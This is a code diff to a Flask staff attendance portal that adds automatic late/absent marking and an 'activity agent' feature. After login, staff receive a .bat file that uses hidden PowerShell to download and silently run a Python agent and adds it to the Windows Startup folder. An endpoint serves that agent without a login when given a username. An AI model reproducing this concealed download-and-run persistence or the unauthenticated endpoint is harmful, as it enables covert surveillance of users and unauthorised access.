@@ -184,6 +184,9 @@ def get_today_stats():
     on_leave = conn.execute(
         "SELECT COUNT(*) FROM attendance WHERE date=? AND status='Leave'", (today,)
     ).fetchone()[0]
+    late = conn.execute(
+        "SELECT COUNT(*) FROM attendance WHERE date=? AND status='Late'", (today,)
+    ).fetchone()[0]
     in_office = conn.execute(
         "SELECT COUNT(*) FROM attendance WHERE date=? AND clock_in IS NOT NULL AND clock_out IS NULL", (today,)
     ).fetchone()[0]
@@ -194,6 +197,7 @@ def get_today_stats():
         'present': present,
         'absent': absent,
         'on_leave': on_leave,
+        'late': late,
         'in_office': in_office,
         'not_arrived': max(not_arrived, 0),
     }
@@ -513,6 +517,11 @@ def verify_pin():
     log_audit('LOGIN_SUCCESS', f"Role: {pending.get('role')}", pending.get('user_id'))
     logger.info("Login successful: %s (%s)", username, pending.get('role'))
     flash("✅ Logged in successfully!", "success")
+
+    # Staff → trigger agent download page first
+    if pending.get('role') == 'Staff':
+        return redirect(url_for('agent_launch'))
+
     return redirect(url_for('index'))
 
 
@@ -1252,6 +1261,207 @@ def api_status():
 # ---------------------------------------------------------------------------
 # Auto-backup on startup
 # ---------------------------------------------------------------------------
+# ---------------------------------------------------------------------------
+# AUTO-AGENT LAUNCH (runs after staff login — no installation needed)
+# ---------------------------------------------------------------------------
+
+@app.route('/agent-launch')
+def agent_launch():
+    """Page shown after staff login — auto-triggers agent download"""
+    if 'user_id' not in session or session['role'] != 'Staff':
+        return redirect(url_for('login'))
+    return render_template('agent_launch.html')
+
+
+@app.route('/download-agent')
+def download_agent():
+    """Serve a personalized .bat file for this logged-in staff member"""
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+
+    username = session['username']
+    password_hint = "your-password"  # Staff enters it themselves
+
+    # Detect server IP from request
+    server_ip = request.host
+    scheme    = request.scheme
+
+    # Build bat content line by line to avoid string escaping issues
+    lines = [
+        '@echo off',
+        f':: StaffPortal Activity Agent for {username}',
+        'set AGENT_DIR=%APPDATA%\\StaffAgent',
+        f'set SERVER={scheme}://{server_ip}',
+        f'set USERNAME={username}',
+        'mkdir "%AGENT_DIR%" 2>nul',
+        f'powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \'{scheme}://{server_ip}/agent-script?u={username}\' -OutFile \'%AGENT_DIR%\\agent.py\'"',
+        'if not exist "%AGENT_DIR%\\agent.py" (echo Failed & pause & exit /b 1)',
+        'echo Set objShell = WScript.CreateObject("WScript.Shell") > "%AGENT_DIR%\\launch.vbs"',
+        'echo objShell.Run "pythonw.exe " ^& chr(34) ^& "%AGENT_DIR%\\agent.py" ^& chr(34) ^& "", 0, False >> "%AGENT_DIR%\\launch.vbs"',
+        'copy /y "%AGENT_DIR%\\launch.vbs" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\StaffPortalAgent.vbs" >nul',
+        'start "" /b wscript.exe "%AGENT_DIR%\\launch.vbs"',
+        'exit',
+    ]
+    bat_content = '\r\n'.join(lines)
+
+    from flask import Response
+    return Response(
+        bat_content,
+        mimetype='application/octet-stream',
+        headers={
+            'Content-Disposition': f'attachment; filename=start_agent_{username}.bat'
+        }
+    )
+
+
+@app.route('/agent-script')
+def agent_script():
+    """Serve personalized agent.py with credentials embedded"""
+    if 'user_id' not in session:
+        # Allow download via URL param as fallback
+        u = request.args.get('u', '')
+        if not u:
+            return "Unauthorized", 401
+    else:
+        u = session.get('username', request.args.get('u', ''))
+
+    server_ip = f"{request.scheme}://{request.host}"
+
+    conn = get_db_connection()
+    user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
+    conn.close()
+
+    if not user:
+        return "User not found", 404
+
+    # Read base agent template and embed credentials
+    agent_template_path = os.path.join(os.path.dirname(__file__), 'agent', 'agent.py')
+    if not os.path.exists(agent_template_path):
+        return "Agent template not found", 404
+
+    with open(agent_template_path, 'r') as f:
+        content = f.read()
+
+    # Embed server URL and username
+    content = content.replace('http://192.168.1.100:5000', server_ip)
+    content = content.replace('"john"', f'"{u}"')
+
+    from flask import Response
+    return Response(content, mimetype='text/plain')
+
+
+# ---------------------------------------------------------------------------
+# AUTO LATE / ABSENT SCHEDULER
+# ---------------------------------------------------------------------------
+
+import threading
+
+def parse_shift_start(shift_str):
+    """Parse shift string like '09:00 AM - 06:00 PM' → datetime.time"""
+    try:
+        if not shift_str or shift_str.lower() in ('flexible', 'night shift'):
+            return None
+        start_part = shift_str.split('-')[0].strip()  # e.g. "09:00 AM"
+        from datetime import datetime as dt
+        return dt.strptime(start_part, '%I:%M %p').time()
+    except Exception:
+        return None
+
+
+def run_attendance_checker():
+    """
+    Background thread: runs every 60 seconds
+    - 30 mins after shift start with no clock-in → mark LATE
+    - 60 mins after shift start with no clock-in → mark ABSENT
+    """
+    import time as time_module
+
+    while True:
+        try:
+            now_ist      = ist_now()
+            today        = now_ist.strftime('%Y-%m-%d')
+            today_day    = now_ist.strftime('%A')  # e.g. "Monday"
+            now_time     = now_ist.time()
+
+            conn = get_db_connection()
+            staff = conn.execute(
+                "SELECT id, username, shift, weekoff FROM users WHERE role='Staff'"
+            ).fetchall()
+
+            for s in staff:
+                # Skip if today is their weekoff
+                if s['weekoff'] == today_day:
+                    continue
+
+                shift_start = parse_shift_start(s['shift'])
+                if not shift_start:
+                    continue
+
+                # Calculate minutes since shift started
+                from datetime import datetime as dt, timedelta as td
+                shift_dt = dt.combine(now_ist.date(), shift_start)
+                now_dt   = dt.combine(now_ist.date(), now_time)
+                mins_late = (now_dt - shift_dt).total_seconds() / 60
+
+                if mins_late < 0:
+                    continue  # Shift hasn't started yet
+
+                # Check existing attendance record
+                record = conn.execute(
+                    "SELECT * FROM attendance WHERE user_id=? AND date=?",
+                    (s['id'], today)
+                ).fetchone()
+
+                if record and record['clock_in']:
+                    continue  # Already clocked in — no action needed
+
+                if record and record['status'] in ('Absent', 'Leave'):
+                    continue  # Already marked
+
+                if mins_late >= 60:
+                    # 60+ mins late → ABSENT
+                    if record:
+                        conn.execute(
+                            "UPDATE attendance SET status='Absent' WHERE user_id=? AND date=?",
+                            (s['id'], today)
+                        )
+                    else:
+                        conn.execute(
+                            "INSERT INTO attendance (user_id, date, status) VALUES (?,?,?)",
+                            (s['id'], today, 'Absent')
+                        )
+                    log_audit('AUTO_ABSENT',
+                              f"{s['username']} — {mins_late:.0f} mins past shift start",
+                              s['id'])
+                    logger.info(f"AUTO-ABSENT: {s['username']} ({mins_late:.0f} mins late)")
+
+                elif mins_late >= 30:
+                    # 30-59 mins late → LATE
+                    if record:
+                        if record['status'] != 'Late':
+                            conn.execute(
+                                "UPDATE attendance SET status='Late' WHERE user_id=? AND date=?",
+                                (s['id'], today)
+                            )
+                    else:
+                        conn.execute(
+                            "INSERT INTO attendance (user_id, date, status) VALUES (?,?,?)",
+                            (s['id'], today, 'Late')
+                        )
+                    log_audit('AUTO_LATE',
+                              f"{s['username']} — {mins_late:.0f} mins past shift start",
+                              s['id'])
+                    logger.info(f"AUTO-LATE: {s['username']} ({mins_late:.0f} mins late)")
+
+            conn.commit()
+            conn.close()
+
+        except Exception as e:
+            logger.error(f"Attendance checker error: {e}")
+
+        time_module.sleep(60)  # Check every 60 seconds
+
+
 def start_autobackup():
     """Create backup on startup"""
     import atexit
@@ -1273,5 +1483,11 @@ def start_autobackup():
 if __name__ == '__main__':
     init_db()
     start_autobackup()
+
+    # Start auto Late/Absent background scheduler
+    checker = threading.Thread(target=run_attendance_checker, daemon=True)
+    checker.start()
+    logger.info("✅ Auto Late/Absent scheduler started")
+
     debug_mode = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
     app.run(host='0.0.0.0', port=5000, debug=debug_mode)
